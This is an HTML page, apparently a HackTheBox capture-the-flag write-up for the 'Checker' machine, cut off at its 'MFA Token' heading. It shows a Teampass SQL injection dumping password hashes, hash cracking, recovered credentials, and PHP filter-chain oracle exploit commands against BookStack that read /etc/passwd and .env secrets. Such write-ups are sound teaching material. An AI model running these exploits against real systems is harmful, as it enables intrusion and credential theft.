@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.9.0.802637674306">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.9.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Checker (Hard)</title>
+    <meta name="title" content="Checker (Hard)">
+    <meta name="description" content="Checker is a hard-level Linux machine running Teampass and Bookstack on separate ports. The Teampass version has a SQL injection vulnerability ">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/machines/checker/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/checker/">
+    <meta property="og:title" content="Checker (Hard)">
+    <meta property="og:description" content="Checker is a hard-level Linux machine running Teampass and Bookstack on separate ports. The Teampass version has a SQL injection vulnerability ">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/checker.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/checker/">
+    <meta property="twitter:title" content="Checker (Hard)">
+    <meta property="twitter:description" content="Checker is a hard-level Linux machine running Teampass and Bookstack on separate ports. The Teampass version has a SQL injection vulnerability ">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/checker.png">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.9.0.802637674306" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.9.0.802637674306" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.9.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.9.0.802637674306" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.9.0.802637674306" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span class="hidden mt-1 px-2 py-1 ml-4 text-xs font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-md md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-white border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="checker-hard" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#checker-hard">#</doc-anchor-trigger>
+        <span>Checker (Hard)</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
+    <div><a href="../../../../categories/linux/">Linux</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-04-19</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../../../assets/images/headers/checker.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="synopsis" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
+        <span>Synopsis</span>
+    </h1>
+</doc-anchor-target>
+<p>Checker is a hard-level Linux machine running Teampass and Bookstack on separate ports. The Teampass version has a SQL injection vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1545">CVE-2023-1545</a> that can be exploited to obtain user password hashes. By cracking these hashes, we get the password for the Teampass user <code v-pre>bob</code>. Logging into Teampass reveals credentials for both Bookstack user <code v-pre>bob</code> and the SSH user <code v-pre>reader</code>. Attempting SSH login as <code v-pre>reader</code> user shows that two-factor authentication is enabled. Meanwhile, the Bookstack version is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6199">CVE-2023-6199</a>, a local file read flaw via Blind SSRF, which can be exploited to retrieve the 2FA secret key for the <code v-pre>reader</code> user’s SSH account, enabling successful SSH login. We reverse engineer a binary for privilege escalation to root to discover a command injection vulnerability, which we then exploit using a custom script.</p>
+<doc-anchor-target id="reconnaissance">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reconnaissance">#</doc-anchor-trigger>
+        <span>Reconnaissance</span>
+    </h2>
+</doc-anchor-target>
+<p>From our nmap scan we see three ports are open: 22, 80, 8080.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># Nmap 7.94SVN scan initiated Sat Feb 22 21:10:38 2025 as: nmap -v -sCV -oN checker.nmap 10.129.147.247
+Nmap scan report for 10.129.147.247
+Host is up (0.014s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
+|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
+80/tcp   open  http    Apache httpd
+|_http-title: 403 Forbidden
+|_http-server-header: Apache
+8080/tcp open  http    Apache httpd
+|_http-title: 403 Forbidden
+|_http-server-header: Apache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="foothold">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
+        <span>Foothold</span>
+    </h3>
+</doc-anchor-target>
+<p>The main website on port 80 redirects to <code v-pre>checker.htb</code> that makes use of BookStack, a simple, self-hosted, easy-to-use platform for organising and storing information.</p>
+<p>On port 8080, a Teampass instance is running. Since we don&#x27;t have any credentials yet, we start searching online for disclosed vulnerabilities. Searching for teampass on <code v-pre>https://security.sneak.io</code> shows several results, one of which is an <a href="https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612">SQL injection vulnerability</a> that allows us to retrieve two users from the Teampass database.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">s3rpent@OMEN:~$ ./teampass_sqli.sh checker.htb:8080
+There are 2 users in the system:
+admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
+bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy</code></pre>
+</doc-codeblock></div>
+<p>Only Bob&#x27;s password is crackable with Hashcat.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">s3rpent@OMEN:~$ hashcat -m 3200 bob.hash $ROCKYOU
+bob:cheerleader</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="user">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
+        <span>User</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="teampass">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#teampass">#</doc-anchor-trigger>
+        <span>Teampass</span>
+    </h3>
+</doc-anchor-target>
+<p>We can login to the Teampass instance by changing the time and using the credentials on <code v-pre>checker.htb:8080</code> that we found earlier. One of the buttons redirects us to <code v-pre>vault.checker.htb</code> so we can also add this to our <code v-pre>/etc/hosts</code> file. Clicking on the Password tab, we see two items for our user.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/checker/teampass.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can just click on the names of the items to open them.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/checker/teampass1.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Clicking on the <code v-pre>eye</code> icon reveals the password of the BookStack login. The other (<code v-pre>ssh access</code>) also reveals SSH credentials for the user <code v-pre>reader</code>. This will probably be a user on the machine.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">bob@checker.htb:mYSeCr3T_w1kI_P4sSw0rD
+reader:hiccup-publicly-genesis</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="bookstack">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#bookstack">#</doc-anchor-trigger>
+        <span>BookStack</span>
+    </h3>
+</doc-anchor-target>
+<p>We can now login to the Bookstack website as <code v-pre>bob@checker.htb</code>. After logging in we see that the admin user has created some books and pages.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/checker/bookstack.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We don&#x27;t know the exact version of the website, but after searching around the web we can discover <code v-pre>CVE-2023-6199</code> which allows filtering local files on the server. This is possible because the application is vulnerable to SSRF. We can check if this site is vulnerable to the attack described by <a href="https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/">Fluidattacks</a>.</p>
+<p>With writer permissions, we can create a book and create pages. Such pages accept Markdown and HTML code. We can intercept the <code v-pre>save draft</code> function with burpsuite. The blog post talks about using the <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">php_filter_chains_oracle_exploit</a> in order to read files on the server. The idea of this attack is the following:</p>
+<ol>
+<li>Use the <code v-pre>iconv</code> filter with an encoding increasing the data size exponentially to trigger a memory error.</li>
+<li>Use the <code v-pre>dechunk</code> filter to determine the first character of the file, based on the previous error.</li>
+<li>Use the <code v-pre>iconv</code> filter again with encodings having different bytes ordering to swap remaining characters with the first one.</li>
+</ol>
+<p>The Oracle exploit works with url encoded requests, but as we can see in BurpSuite we are sending JSON requests. In order to make the exploit work, we have to changed the <code v-pre>Content-Type</code> to <code v-pre>application/x-www-form-urlencoded</code>. We run the exploit as follows:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">s3rp3nt@OMEN:~$ python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/10/save-draft' --file '/etc/passwd' --verb PUT --parameter html --headers '{&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,&quot;X-CSRF-TOKEN&quot;:&quot;L756lGhCCOxPAtJGbYnt2vWCqFP32qkPA1qZN9K7&quot;,&quot;Cookie&quot;:&quot;XSRF-TOKEN=eyJpdiI6Inc0YTlpRjRaVUlGanNLNWxuMTlYVlE9PSIsInZhbHVlIjoiMCt6T2E0enRlb0tzWExoQVQ2TmQrd2JJQkVqTkt0eXV5Mkcxbm5qQjFyR0l3bXMvZ3RLczBudThKSWNKSWxaUU0xM3ZXSHI1RXJQSlk4cVZLMHRLbXJBL0Fjc09zSmZ4UWlNTFlYTmIyR0dXRGZnMUd6N2RaYmgvMlBxaTF0RVIiLCJtYWMiOiJlZWVjYjA2MzljODk1YTI4OGYwNGRlMThlMWVjZDUyMmY4NDVhYjI0ZGRhMWM0YjQwMGY1YTIyZTA5YzJiMTNmIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImU3dng4c2lFbWRpTHVFQzZEbklVbWc9PSIsInZhbHVlIjoiUWNPWGtJZWs3Ym1oUWZvVDhrdnZVWXNoUGIvcy9md0xjcW1qd2JtRDlvUjlINUdwQ2ExcmdBTmJRcnIrT2dsdDhFMXNSZWNaUUMvZFpKaGtnbXBBZXY2eWQ0K1hnNGlUZCtSRXhOWnVYc2UydWV3eFFmS2FSSkY4RXFEeGtOWUciLCJtYWMiOiI3ZGU0MWMwYTg5NDZiZWI1YzYzNGQxMzk1ZTI3ZDc1ZGE4ZGIyMWY5MGZkYmRmOGYwMGM2NWE1NzFiMzhlNmRlIiwidGFnIjoiIn0%3D; teampass_session=j7355s4vo14islb0n6e34usucu; jstree_select=1; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=071b2fcb9049e82b06036864832ea6a9364392df2c1fe3f364&quot;}' --proxy http://localhost:8080
+[*] The following URL is targeted : http://checker.htb/ajax/page/10/save-draft
+[*] The following local file is leaked : /etc/passwd
+[*] Running PUT requests</code></pre>
+</doc-codeblock></div>
+<p>The above command fails with several errors about encoding problems. We redirect our request to BurpSuite with the <code v-pre>--proxy</code> argument and inspect the requests that are made.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/checker/burp-oracle-wrong.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>If we follow along with the video in the PoC, our <code v-pre>html</code> parameter has to be in the format of <code v-pre>&lt;img=src='data:image/png;base64,&lt;BASE64_PAYLOAD&gt;' /&gt;</code>. We will have to make some modifications to the script. If we go to <code v-pre>filters_chain_oracle/core/requestor.py</code> we can modify line 108 to base64 encode our payload and add the required <code v-pre>img</code> tag.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/checker/burp-oracle-changes.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can now run the exploit script again and should be able to read files from the server. The correct request will look something like this:</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/checker/burp-oracle-right.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>For instance we can verify the version of the BookStore application by targeting <code v-pre>../version</code> (version=v23.10.2).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">s3rp3nt@OMEN:~/php_filter_chains_oracle_exploit$ python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/10/save-draft' --file '../version' --verb PUT --parameter html --headers '{&quot;X-CSRF-TOKEN&quot;:&quot;L756lGhCCOxPAtJGbYnt2vWCqFP32qkPA1qZN9K7&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,&quot;Cookie&quot;:&quot;XSRF-TOKEN=eyJpdiI6Inc0YTlpRjRaVUlGanNLNWxuMTlYVlE9PSIsInZhbHVlIjoiMCt6T2E0enRlb0tzWExoQVQ2TmQrd2JJQkVqTkt0eXV5Mkcxbm5qQjFyR0l3bXMvZ3RLczBudThKSWNKSWxaUU0xM3ZXSHI1RXJQSlk4cVZLMHRLbXJBL0Fjc09zSmZ4UWlNTFlYTmIyR0dXRGZnMUd6N2RaYmgvMlBxaTF0RVIiLCJtYWMiOiJlZWVjYjA2MzljODk1YTI4OGYwNGRlMThlMWVjZDUyMmY4NDVhYjI0ZGRhMWM0YjQwMGY1YTIyZTA5YzJiMTNmIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImU3dng4c2lFbWRpTHVFQzZEbklVbWc9PSIsInZhbHVlIjoiUWNPWGtJZWs3Ym1oUWZvVDhrdnZVWXNoUGIvcy9md0xjcW1qd2JtRDlvUjlINUdwQ2ExcmdBTmJRcnIrT2dsdDhFMXNSZWNaUUMvZFpKaGtnbXBBZXY2eWQ0K1hnNGlUZCtSRXhOWnVYc2UydWV3eFFmS2FSSkY4RXFEeGtOWUciLCJtYWMiOiI3ZGU0MWMwYTg5NDZiZWI1YzYzNGQxMzk1ZTI3ZDc1ZGE4ZGIyMWY5MGZkYmRmOGYwMGM2NWE1NzFiMzhlNmRlIiwidGFnIjoiIn0%3D; teampass_session=j7355s4vo14islb0n6e34usucu; jstree_select=1; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=071b2fcb9049e82b06036864832ea6a9364392df2c1fe3f364&quot;}'
+[*] The following URL is targeted : http://checker.htb/ajax/page/10/save-draft
+[*] The following local file is leaked : ../version
+[*] Running PUT requests
+[+] File ../version leak is finished!
+djIzLjEwLjIK
+b'v23.10.2\n'</code></pre>
+</doc-codeblock></div>
+<p>Since this process is very slow, we need to find good useful files to read on the server. I leaked the <code v-pre>/etc/passwd</code> with offset <code v-pre>1394</code> to get the users on the machine (but we alread knew <code v-pre>reader</code> was a user). I also tried to leak the <code v-pre>.env</code> file at the root of the application, but these credentials where not very useful.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session"># /etc/passwd user
+reader:x:1000:1000::/home/reader:/bin/bash
+
+# .env file 
+APP_KEY=base64:A+Io9TrHdEwh5pyUfh9KJmLEw6ujrMd5uXPaWB4TnLw=
+
+DB_USERNAME=bookstack
+DB_PASSWORD=pK8HK7IHCKLCNHUJ7</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="mfa-token">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#mfa-token">#</doc-anchor-trigger>
+        <span>MFA Token</span>
+    </h3>
+</doc-anchor-target>
